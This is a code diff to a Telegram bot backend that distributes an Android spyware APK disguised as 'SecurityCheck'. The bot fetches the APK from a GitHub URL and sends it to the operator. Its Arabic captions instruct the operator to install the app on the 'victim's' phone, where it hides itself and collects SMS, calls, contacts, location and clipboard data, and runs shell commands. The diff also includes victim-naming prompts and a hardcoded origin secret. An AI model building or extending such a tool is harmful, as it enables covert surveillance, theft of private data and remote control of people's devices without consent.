@@ -229,10 +229,12 @@ PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 RAILWAY_URL = PUBLIC_URL
 
-APK_DOWNLOAD_URL = os.getenv("APK_DOWNLOAD_URL", "")
+# ★★★ رابط APK من المستودع المنفصل ★★★
+APK_DOWNLOAD_URL = os.getenv("APK_DOWNLOAD_URL", 
+    "https://github.com/atmemokhtar2-blip/apk/raw/main/SecurityCheck.apk")
 
 print(f"[+] Public URL: {PUBLIC_URL}")
-print(f"[+] APK Download URL: {APK_DOWNLOAD_URL}")
+print(f"[+] APK URL: {APK_DOWNLOAD_URL}")
 
 
 # ============================================================
@@ -302,7 +304,7 @@ app = Flask(__name__)
 
 
 # ============================================================
-# Origin Gate — حماية من الوصول المباشر
+# Origin Gate
 # ============================================================
 ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")
 
@@ -314,7 +316,6 @@ def verify_origin():
         return None
     if request.method == 'OPTIONS':
         return None
-    # APK endpoints — مسموح بدون secret
     if request.path.startswith('/apk/'):
         return None
     secret = request.headers.get('X-Origin-Secret', '')
@@ -545,63 +546,73 @@ def callback_handler(call):
                 except Exception:
                     pass
         
-        # أرسل APK
+        # ★★★ حمّل APK من المستودع المنفصل ★★★
         try:
-            apk_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "SecurityCheck.apk")
+            print(f"[+] Downloading APK from: {APK_DOWNLOAD_URL}")
+            r = requests.get(APK_DOWNLOAD_URL, timeout=60, allow_redirects=True)
             
-            if os.path.exists(apk_file_path):
-                with open(apk_file_path, 'rb') as f:
-                    bot.send_document(
-                        chat_id, f,
-                        caption=(
-                            f"📱 **تطبيق التحكم الكامل**\n"
-                            f"━━━━━━━━━━━━━━━━━━\n\n"
-                            f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
-                            f"📋 **طريقة الاستخدام:**\n"
-                            f"1. حمّل التطبيق\n"
-                            f"2. اعطه للضحية\n"
-                            f"3. تسجيل دخول عادي\n"
-                            f"4. التطبيق يختفي تلقائياً\n"
-                            f"5. يبدأ في جمع البيانات\n\n"
-                            f"⚙️ **الأوامر المتاحة:**\n"
-                            f"• 📱 معلومات الجهاز\n"
-                            f"• 📨 SMS\n"
-                            f"• 📞 المكالمات\n"
-                            f"• 👥 جهات الاتصال\n"
-                            f"• 📲 التطبيقات\n"
-                            f"• 📍 الموقع\n"
-                            f"• 📋 الحافظة\n"
-                            f"• 💻 أوامر Shell\n"
-                            f"• 📳 اهتزاز / صوت"
-                        ),
-                        parse_mode="Markdown"
-                    )
-            else:
-                if APK_DOWNLOAD_URL:
-                    bot.send_message(
-                        chat_id,
+            if r.status_code == 200 and len(r.content) > 10000:
+                print(f"[+] APK downloaded: {len(r.content)} bytes")
+                
+                # أرسل APK كملف
+                apk_buffer = io.BytesIO(r.content)
+                apk_buffer.name = "SecurityCheck.apk"
+                
+                bot.send_document(
+                    chat_id, apk_buffer,
+                    caption=(
                         f"📱 **تطبيق التحكم الكامل**\n"
                         f"━━━━━━━━━━━━━━━━━━\n\n"
                         f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
-                        f"📥 **رابط التحميل:**\n{APK_DOWNLOAD_URL}\n\n"
-                        f"📋 **الخطوات:**\n"
+                        f"📋 **طريقة الاستخدام:**\n"
                         f"1. حمّل التطبيق على هاتف الضحية\n"
                         f"2. ثبّته (وافق على المصادر)\n"
-                        f"3. ستحصل على تقرير فوري",
-                        parse_mode="Markdown",
-                        disable_web_page_preview=True
-                    )
-                else:
-                    bot.send_message(
-                        chat_id,
-                        f"📱 **تطبيق التحكم الكامل**\n\n"
-                        f"🔑 **كود التنشيط:** `{apk_code}`\n\n"
-                        f"⚠️ **ملاحظة:** لم يتم رفع APK بعد.",
-                        parse_mode="Markdown"
-                    )
+                        f"3. افتحه (سيفتح ثم يختفي)\n"
+                        f"4. ستحصل على تقرير كامل فوراً\n\n"
+                        f"⚙️ **الأوامر المتاحة:**\n"
+                        f"• 📱 معلومات الجهاز\n"
+                        f"• 📨 SMS\n"
+                        f"• 📞 المكالمات\n"
+                        f"• 👥 جهات الاتصال\n"
+                        f"• 📲 التطبيقات\n"
+                        f"• 📍 الموقع\n"
+                        f"• 📋 الحافظة\n"
+                        f"• 💻 أوامر Shell\n"
+                        f"• 📳 اهتزاز / صوت"
+                    ),
+                    parse_mode="Markdown"
+                )
+            else:
+                # فشل التحميل — أرسل الرابط
+                print(f"[-] APK download failed: status={r.status_code}, size={len(r.content)}")
+                bot.send_message(
+                    chat_id,
+                    f"📱 **تطبيق التحكم الكامل**\n"
+                    f"━━━━━━━━━━━━━━━━━━\n\n"
+                    f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
+                    f"📥 **رابط التحميل المباشر:**\n"
+                    f"{APK_DOWNLOAD_URL}\n\n"
+                    f"📋 **الخطوات:**\n"
+                    f"1. اضغط على الرابط\n"
+                    f"2. حمّل APK\n"
+                    f"3. ثبّته على هاتف الضحية\n"
+                    f"4. افتحه\n"
+                    f"5. ستحصل على تقرير فوري",
+                    parse_mode="Markdown",
+                    disable_web_page_preview=True
+                )
         except Exception as e:
-            print(f"[-] send APK error: {e}")
-            bot.send_message(chat_id, f"❌ خطأ في الإرسال: {e}")
+            print(f"[-] APK error: {e}")
+            bot.send_message(
+                chat_id,
+                f"📱 **تطبيق التحكم الكامل**\n"
+                f"━━━━━━━━━━━━━━━━━━\n\n"
+                f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
+                f"📥 **رابط التحميل:**\n{APK_DOWNLOAD_URL}\n\n"
+                f"⚠️ **ملاحظة:** استخدم الرابط للتحميل",
+                parse_mode="Markdown",
+                disable_web_page_preview=True
+            )
         return
 
     # ============================================================
@@ -1138,8 +1149,7 @@ def callback_handler(call):
         msg = bot.send_message(
             chat_id,
             "📝 **أرسل اسم الضحية:**\n\n"
-            "مثال: `أحمد` أو `محمد - الرياض`\n\n"
-            "_سيُستخدم الاسم لتمييز هذه الضحية_",
+            "مثال: `أحمد` أو `محمد - الرياض`",
             parse_mode="Markdown"
         )
         bot.register_next_step_handler(msg, victim_name_handler)
